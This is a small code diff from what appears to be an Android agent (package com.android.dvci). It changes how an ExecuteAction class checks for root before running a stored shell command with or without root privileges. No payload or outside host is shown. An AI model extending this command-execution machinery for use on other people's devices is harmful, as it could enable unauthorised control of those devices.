@@ -10,6 +10,7 @@
 package com.android.dvci.action;
 
 import com.android.dvci.Root;
+import com.android.dvci.Status;
 import com.android.dvci.Trigger;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.capabilities.PackageInfo;
@@ -81,7 +82,7 @@ public class ExecuteAction extends SubActionSlow {
 			Check.log(TAG + " (execute): " + command);
 		}
 
-		if (PackageInfo.checkRoot()) {
+		if (Status.haveRoot()) {
 			ret = Execute.executeRoot(this.command);
 		} else {
 			ret = Execute.execute(this.command);
